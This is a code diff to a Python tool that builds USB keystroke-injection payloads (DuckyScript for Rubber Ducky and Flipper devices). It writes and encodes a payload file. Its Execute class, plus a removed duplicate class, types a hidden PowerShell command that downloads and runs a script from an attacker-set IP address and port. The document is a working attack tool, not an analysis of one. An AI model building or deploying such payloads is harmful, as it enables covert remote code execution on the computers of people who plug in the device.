@@ -22,24 +22,30 @@ class USBPayload:
         """ Builds a payload text file
         :return: True if the file was created
         """
-        self.temp = tempfile.TemporaryFile()
+        self.path = f"{self.config.CWD}\\payload.txt"
+        try:
+            os.unlink(self.path)
+        except FileNotFoundError:
+            pass
+        self.temp = open(self.path, "ab+")
         if "START_DELAY_TIME" in self.source:
             self.source = self.source.replace("START_DELAY_TIME", str(self.config.delay))
         for key, line in self.lines.items():
             self.source = self.source.replace(key, line)
+        self.temp.seek(0)
         return bool(self.temp.write(self.source.encode()))
 
-    def __encode_payload(self) -> bool:
+    def __encode_payload(self):
         """ Encodes the payload.txt into inject.bin
         1. Requires java
         2. Requires encode.jar
         :return: True if the file was made
         """
         try:
-            output = get_output(["java", "-jar", f"{self.config.CWD}/encoder.jar", "-i", f"{self.filename}", "-o", "inject.bin", "-l", self.config.keyboard_layout])
+            out = get_output(["java", "-jar", f"encoder.jar", "-i", f"{self.path}", "-l", self.config.keyboard_layout])
+            return b"DuckyScript Complete" in out 
         except FileNotFoundError:
             raise MissingJava
-        return "DuckyScript Complete" in output.decode()
 
     def execute(self) -> bool:
         self.__build()
@@ -47,9 +53,13 @@ class USBPayload:
             self.__encode_payload()
         if self.config.flipper:
             self.temp.seek(0)
-            make_unix_here(self.temp.read(), self.config.CWD + f"/{self.config.flipper}")
+            make_unix_here(self.temp.read(), self.config.CWD + f"\\{self.config.flipper}")
         self.temp.close()
         return True
+
+    def stop(self):
+        if self.temp:
+            self.temp.close()
 
 class BindAndExecute(USBPayload):
     def __init__(self, config: Config):
@@ -68,15 +78,6 @@ class Execute(USBPayload):
         self.lines: dict = {
             "KEY1": f"STRING powershell -w hidden IEX (New-Object Net.WebClient).DownloadString('http://{self.config.ip_address}:{self.config.server_port}/{self.config.out_file}')"
         }
-
-class DownloadExternal(USBPayload):
-    def __init__(self, config: Config):
-        self.config = config
-        self.source = get_file_content(self.config.TEMPLATE_DIR + "basic-payload.txt")
-        self.lines: dict = {
-            "KEY1": f"STRING powershell -w hidden IEX (New-Object Net.WebClient).DownloadString('http://{self.config.ip_address}:{self.config.server_port}/{self.config.out_file}')"
-        }
-
 
 PAYLOADS = {
     "execute": Execute,
